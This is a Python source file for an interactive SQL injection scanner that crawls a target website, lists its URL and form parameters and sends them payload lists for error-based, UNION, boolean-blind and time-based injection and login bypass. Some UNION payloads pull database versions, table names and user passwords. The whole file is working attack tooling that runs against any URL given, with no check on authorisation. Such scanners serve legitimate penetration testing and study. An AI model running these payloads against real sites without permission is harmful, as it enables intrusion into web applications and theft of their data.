import requests
from urllib.parse import urljoin, urlparse, parse_qs
from bs4 import BeautifulSoup
import time
import re
from collections import deque
import argparse
import os

class SQLInjectionScanner:
    def __init__(self, target_url, delay=1, max_pages=50):
        self.target_url = target_url
        self.delay = delay
        self.max_pages = max_pages
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.visited_urls = set()
        self.forms_found = []
        self.vulnerabilities = []
        self.has_crawled = False
        
        # Define all SQL injection attack types
        self.attack_types = {
            1: {
                'name': 'Error-Based SQL Injection',
                'description': 'Causes database errors to reveal information',
                'payloads': [
                    "'",
                    "';",
                    "\"",
                    "\";",
                    "' OR '1'='1",
                    "' OR 1=1--",
                    "') OR ('1'='1",
                    "' OR 1=1#",
                    "' OR 'x'='x"
                ]
            },
            2: {
                'name': 'Union-Based SQL Injection',
                'description': 'Uses UNION to extract data from other tables',
                'payloads': [
                    "' UNION SELECT 1,2,3--",
                    "' UNION SELECT 1,@@version,3--",
                    "' UNION SELECT 1,database(),3--",
                    "' UNION SELECT 1,table_name,3 FROM information_schema.tables--",
                    "' UNION SELECT 1,column_name,3 FROM information_schema.columns--",
                    "' UNION SELECT 1,user(),3--",
                    "' UNION SELECT 1,password,3 FROM users--"
                ]
            },
            3: {
                'name': 'Boolean-Based Blind SQLi',
                'description': 'Uses true/false conditions to infer data',
                'payloads': [
                    "' AND 1=1--",
                    "' AND 1=2--",
                    "' AND (SELECT substring(@@version,1,1))='5'--",
                    "' AND (SELECT ascii(substring(user(),1,1)))=114--",
                    "' AND (SELECT COUNT(*) FROM users) > 0--",
                    "' AND EXISTS(SELECT * FROM users)--"
                ]
            },
            4: {
                'name': 'Time-Based Blind SQLi',
                'description': 'Uses time delays to detect vulnerabilities',
                'payloads': [
                    "' OR SLEEP(5)--",
                    "' OR BENCHMARK(1000000,MD5(1))--",
                    "' OR (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                    "' OR IF(1=1,SLEEP(5),0)--",
                    "' OR WAITFOR DELAY '00:00:05'--"
                ]
            },
            5: {
                'name': 'Authentication Bypass',
                'description': 'Bypasses login forms',
                'payloads': [
                    "' OR '1'='1",
                    "admin'--",
                    "admin'#",
                    "' OR 1=1--",
                    "admin' OR '1'='1'--",
                    "' OR 'a'='a",
                    "') OR ('x'='x"
                ]
            },
            6: {
                'name': 'All Attacks (Comprehensive)',
                'description': 'Runs all available payload types',
                'payloads': []  # Will be populated dynamically
            }
        }
        
        # Populate "All Attacks" with all payloads
        all_payloads = []
        for attack_id in range(1, 6):
            all_payloads.extend(self.attack_types[attack_id]['payloads'])
        self.attack_types[6]['payloads'] = list(set(all_payloads))  # Remove duplicates
        
        # Error patterns for detection
        self.error_patterns = [
            r"mysql_fetch_array",
            r"mysql_num_rows",
            r"ORA-\d{5}",
            r"Microsoft OLE DB Provider",
            r"ODBC Driver",
            r"SQLServer JDBC Driver",
            r"PostgreSQL.*ERROR",
            r"Warning.*mysql",
            r"Unclosed quotation mark",
            r"Syntax error",
            r"SQL syntax",
            r"MySQL server version",
            r"Microsoft SQL Server",
            r"PostgreSQL.*ERROR",
            r"SQLite.*error"
        ]

    def clear_screen(self):
        """Clear the terminal screen"""
        os.system('cls' if os.name == 'nt' else 'clear')

    def display_main_menu(self):
        """Display the main menu"""
        self.clear_screen()
        print("\n" + "="*70)
        print(f"SQL INJECTION SCANNER - TARGET: {self.target_url}")
        print("="*70)
        print(f"Pages Crawled: {len(self.visited_urls)}")
        print(f"Forms Found: {len(self.forms_found)}")
        print(f"Vulnerabilities Found: {len(self.vulnerabilities)}")
        print("="*70)
        print("\nMAIN MENU:")
        print("1. 🕷️  Crawl Website (Discover Pages & Forms)")
        print("2. 🎯 Test Specific Parameters")
        print("3. 📊 Show Discovered Parameters")
        print("4. 🚀 Run Comprehensive Scan (Crawl + Test All)")
        print("5. 📄 Show Vulnerability Report")
        print("6. 🔄 Change Target URL")
        print("7. 🚪 Exit")
        print("\n" + "="*70)

    def display_attack_menu(self):
        """Display available attack types to user"""
        print("\n" + "="*60)
        print("SQL INJECTION ATTACK TYPES")
        print("="*60)
        
        for attack_id, attack_info in self.attack_types.items():
            print(f"{attack_id}. {attack_info['name']}")
            print(f"   Description: {attack_info['description']}")
            print(f"   Payloads: {len(attack_info['payloads'])}")
            print()
        
        print("="*60)

    def get_user_attack_choice(self):
        """Get user input for attack type selection"""
        while True:
            try:
                choice = input("\nSelect attack type (1-6) or 'all' for all: ").strip()
                if choice.lower() == 'all':
                    return [6]  # All attacks
                elif ',' in choice:
                    # Multiple selections like "1,3,5"
                    choices = [int(x.strip()) for x in choice.split(',')]
                    if all(1 <= c <= 6 for c in choices):
                        return choices
                    else:
                        print("❌ Invalid selection. Please choose numbers between 1-6.")
                else:
                    choice_int = int(choice)
                    if 1 <= choice_int <= 6:
                        return [choice_int]
                    else:
                        print("❌ Invalid selection. Please choose numbers between 1-6.")
            except ValueError:
                print("❌ Please enter valid numbers (1-6) or 'all'.")

    def display_discovered_parameters(self):
        """Display all discovered parameters and forms to user"""
        print("\n" + "="*60)
        print("DISCOVERED PARAMETERS AND FORMS")
        print("="*60)
        
        url_params = []
        form_params = []
        
        # Collect URL parameters
        for url in self.visited_urls:
            parsed = urlparse(url)
            if parsed.query:
                params = parse_qs(parsed.query)
                for param in params:
                    url_params.append({
                        'url': url,
                        'param': param,
                        'type': 'URL Parameter'
                    })
        
        # Collect form parameters
        for form in self.forms_found:
            for input_field in form['inputs']:
                if input_field['type'] in ['text', 'search', 'email', 'password']:
                    form_params.append({
                        'url': form['action'],
                        'param': input_field['name'],
                        'type': f"Form Input ({form['method'].upper()})"
                    })
        
        all_params = url_params + form_params
        
        if not all_params:
            print("❌ No parameters found to test!")
            return []
        
        print(f"\nFound {len(all_params)} parameters:")
        for i, param_info in enumerate(all_params, 1):
            print(f"{i}. {param_info['type']}: {param_info['param']}")
            print(f"   URL: {param_info['url']}")
            print()
        
        return all_params

    def get_user_parameter_choice(self, all_params):
        """Get user input for parameter selection"""
        if not all_params:
            return []
            
        while True:
            try:
                choice = input(
                    f"\nSelect parameters to test (1-{len(all_params)}, 'all', or comma-separated): "
                ).strip()
                
                if choice.lower() == 'all':
                    return all_params
                elif ',' in choice:
                    choices = [int(x.strip()) for x in choice.split(',')]
                    if all(1 <= c <= len(all_params) for c in choices):
                        return [all_params[c-1] for c in choices]
                    else:
                        print(f"❌ Invalid selection. Please choose numbers between 1-{len(all_params)}.")
                else:
                    choice_int = int(choice)
                    if 1 <= choice_int <= len(all_params):
                        return [all_params[choice_int-1]]
                    else:
                        print(f"❌ Invalid selection. Please choose numbers between 1-{len(all_params)}.")
            except ValueError:
                print(f"❌ Please enter valid numbers (1-{len(all_params)}), 'all', or comma-separated list.")

    def crawl_website(self):
        """Crawl the website to find all pages and forms"""
        print(f"\n[*] Starting crawl of {self.target_url}")
        queue = deque([self.target_url])
        
        # Clear previous crawl data if re-crawling
        if not self.has_crawled:
            self.visited_urls.clear()
            self.forms_found.clear()
        
        while queue and len(self.visited_urls) < self.max_pages:
            url = queue.popleft()
            
            if url in self.visited_urls:
                continue
                
            try:
                print(f"[*] Crawling: {url}")
                response = self.session.get(url, timeout=10)
                self.visited_urls.add(url)
                
                # Extract forms from current page
                self.extract_forms(response.content, url)
                
                # Extract links for further crawling
                links = self.extract_links(response.content, url)
                for link in links:
                    if link not in self.visited_urls and link not in queue:
                        queue.append(link)
                        
                time.sleep(self.delay)
                
            except Exception as e:
                print(f"[-] Error crawling {url}: {e}")
                
        self.has_crawled = True
        print(f"[*] Crawling completed. Found {len(self.visited_urls)} pages and {len(self.forms_found)} forms")
        input("\nPress Enter to continue...")

    def extract_links(self, html_content, base_url):
        """Extract all links from HTML content"""
        soup = BeautifulSoup(html_content, 'html.parser')
        links = []
        
        for link in soup.find_all('a', href=True):
            href = link['href']
            full_url = urljoin(base_url, href)
            if self.is_same_domain(full_url) and full_url not in self.visited_urls:
                links.append(full_url)
                
        return links

    def extract_forms(self, html_content, url):
        """Extract all forms from HTML content"""
        soup = BeautifulSoup(html_content, 'html.parser')
        forms = []
        
        for form in soup.find_all('form'):
            form_details = {
                'action': urljoin(url, form.get('action', '')),
                'method': form.get('method', 'get').lower(),
                'inputs': []
            }
            
            for input_tag in form.find_all('input'):
                input_details = {
                    'name': input_tag.get('name'),
                    'type': input_tag.get('type', 'text'),
                    'value': input_tag.get('value', '')
                }
                if input_details['name']:
                    form_details['inputs'].append(input_details)
                    
            self.forms_found.append(form_details)
            forms.append(form_details)
            
        return forms

    def is_same_domain(self, url):
        """Check if URL belongs to the same domain as target"""
        target_domain = urlparse(self.target_url).netloc
        url_domain = urlparse(url).netloc
        return target_domain == url_domain

    def test_selected_parameters(self, selected_attacks, selected_params):
        """Test only the user-selected parameters with selected attack types"""
        print(f"\n[*] Starting targeted SQL injection testing...")
        print(f"[*] Attack types: {len(selected_attacks)}")
        print(f"[*] Parameters to test: {len(selected_params)}")
        
        # Collect all payloads from selected attack types
        all_payloads = []
        for attack_id in selected_attacks:
            all_payloads.extend(self.attack_types[attack_id]['payloads'])
        
        # Remove duplicates
        all_payloads = list(set(all_payloads))
        print(f"[*] Total payloads to test: {len(all_payloads)}")
        
        vulnerabilities_found = 0
        
        for param_info in selected_params:
            print(f"\n[*] Testing {param_info['type']}: {param_info['param']}")
            print(f"    URL: {param_info['url']}")
            
            if param_info['type'] == 'URL Parameter':
                vuln_found = self.test_url_parameter(param_info['url'], param_info['param'], all_payloads)
            else:
                # It's a form parameter
                form_method = 'post' if 'POST' in param_info['type'] else 'get'
                vuln_found = self.test_form_parameter(param_info['url'], param_info['param'], all_payloads, form_method)
            
            if vuln_found:
                vulnerabilities_found += 1
        
        print(f"\n[*] Testing completed. Found {vulnerabilities_found} vulnerable parameters.")
        input("\nPress Enter to continue...")

    def test_url_parameter(self, url, param_name, payloads):
        """Test a specific URL parameter with given payloads"""
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)
        vulnerability_found = False
        
        for payload in payloads:
            try:
                # Create test URL with payload
                test_params = query_params.copy()
                test_params[param_name] = payload
                
                # Rebuild URL with test parameters
                test_query = '&'.join([f"{k}={v[0]}" for k, v in test_params.items()])
                test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{test_query}"
                
                response = self.session.get(test_url, timeout=10)
                
                # Check for SQL errors
                if self.check_sql_errors(response.text):
                    vulnerability = {
                        'type': 'URL Parameter',
                        'location': url,
                        'parameter': param_name,
                        'payload': payload,
                        'evidence': 'SQL error detected'
                    }
                    self.vulnerabilities.append(vulnerability)
                    print(f"    ✅ VULNERABLE - Payload: {payload}")
                    vulnerability_found = True
                    break
                    
            except Exception as e:
                print(f"    ❌ Error testing payload {payload}: {e}")
        
        if not vulnerability_found:
            print(f"    🔒 No vulnerabilities found in {param_name}")
        
        return vulnerability_found

    def test_form_parameter(self, form_action, param_name, payloads, method='post'):
        """Test a specific form parameter with given payloads"""
        # Find the form details
        target_form = None
        for form in self.forms_found:
            if form['action'] == form_action:
                target_form = form
                break
        
        if not target_form:
            print(f"    ❌ Form not found: {form_action}")
            return False
        
        vulnerability_found = False
        
        for payload in payloads:
            try:
                # Prepare form data
                form_data = {}
                for field in target_form['inputs']:
                    if field['name'] == param_name:
                        form_data[field['name']] = payload
                    else:
                        form_data[field['name']] = field['value']
                
                # Submit form
                if method == 'post':
                    response = self.session.post(form_action, data=form_data, timeout=10)
                else:
                    response = self.session.get(form_action, params=form_data, timeout=10)
                
                # Check for SQL errors
                if self.check_sql_errors(response.text):
                    vulnerability = {
                        'type': 'Form Input',
                        'location': form_action,
                        'parameter': param_name,
                        'payload': payload,
                        'evidence': 'SQL error detected'
                    }
                    self.vulnerabilities.append(vulnerability)
                    print(f"    ✅ VULNERABLE - Payload: {payload}")
                    vulnerability_found = True
                    break
                    
            except Exception as e:
                print(f"    ❌ Error testing payload {payload}: {e}")
        
        if not vulnerability_found:
            print(f"    🔒 No vulnerabilities found in {param_name}")
        
        return vulnerability_found

    def check_sql_errors(self, response_text):
        """Check if response contains SQL error patterns"""
        for pattern in self.error_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True
        return False

    def run_comprehensive_scan(self):
        """Run a complete scan (crawl + test all)"""
        print(f"\n[*] Starting comprehensive scan of {self.target_url}")
        
        # Step 1: Crawl the website
        self.crawl_website()
        
        # Step 2: Test all parameters with all attacks
        discovered_params = self.display_discovered_parameters()
        if not discovered_params:
            return
        
        print("\n[*] Testing all parameters with all attack types...")
        self.test_selected_parameters([6], discovered_params)  # [6] = All attacks

    def show_vulnerability_report(self):
        """Show the current vulnerability report"""
        self.clear_screen()
        print("\n" + "="*60)
        print("VULNERABILITY REPORT")
        print("="*60)
        
        print(f"\nTarget: {self.target_url}")
        print(f"Vulnerabilities found: {len(self.vulnerabilities)}")
        
        if self.vulnerabilities:
            print("\n[!] VULNERABILITIES FOUND:")
            for i, vuln in enumerate(self.vulnerabilities, 1):
                print(f"\n{i}. Type: {vuln['type']}")
                print(f"   Location: {vuln['location']}")
                print(f"   Parameter: {vuln['parameter']}")
                print(f"   Payload: {vuln['payload']}")
                print(f"   Evidence: {vuln['evidence']}")
        else:
            print("\n[+] No SQL injection vulnerabilities found!")
        
        input("\nPress Enter to continue...")

    def change_target_url(self):
        """Change the target URL"""
        new_url = input("\nEnter new target URL: ").strip()
        if new_url:
            self.target_url = new_url
            # Reset scan data for new target
            self.visited_urls.clear()
            self.forms_found.clear()
            self.vulnerabilities.clear()
            self.has_crawled = False
            print(f"[*] Target changed to: {new_url}")
        else:
            print("❌ No URL provided.")
        input("\nPress Enter to continue...")

    def run_interactive_mode(self):
        """Run the interactive main menu loop"""
        while True:
            self.display_main_menu()
            choice = input("\nSelect option (1-7): ").strip()
            
            if choice == '1':
                self.crawl_website()
                
            elif choice == '2':
                if not self.has_crawled:
                    print("❌ Please crawl the website first (Option 1)")
                    input("Press Enter to continue...")
                    continue
                    
                discovered_params = self.display_discovered_parameters()
                if not discovered_params:
                    input("Press Enter to continue...")
                    continue
                    
                selected_params = self.get_user_parameter_choice(discovered_params)
                if selected_params:
                    self.display_attack_menu()
                    selected_attacks = self.get_user_attack_choice()
                    self.test_selected_parameters(selected_attacks, selected_params)
                
            elif choice == '3':
                if not self.has_crawled:
                    print("❌ Please crawl the website first (Option 1)")
                else:
                    self.display_discovered_parameters()
                input("\nPress Enter to continue...")
                
            elif choice == '4':
                self.run_comprehensive_scan()
                
            elif choice == '5':
                self.show_vulnerability_report()
                
            elif choice == '6':
                self.change_target_url()
                
            elif choice == '7':
                print("\n👋 Thank you for using SQL Injection Scanner!")
                break
                
            else:
                print("❌ Invalid option. Please choose 1-7.")
                input("Press Enter to continue...")

def main():
    parser = argparse.ArgumentParser(description='Continuous SQL Injection Scanner')
    parser.add_argument('url', nargs='?', help='Target URL to scan')
    parser.add_argument('-d', '--delay', type=float, default=1, help='Delay between requests (seconds)')
    parser.add_argument('-m', '--max-pages', type=int, default=50, help='Maximum pages to crawl')
    
    args = parser.parse_args()
    
    # Get target URL from args or user input
    target_url = args.url
    if not target_url:
        target_url = input("Enter target URL: ").strip()
        if not target_url:
            print("❌ No target URL provided.")
            return
    
    scanner = SQLInjectionScanner(target_url, args.delay, args.max_pages)
    scanner.run_interactive_mode()

if __name__ == "__main__":
    main()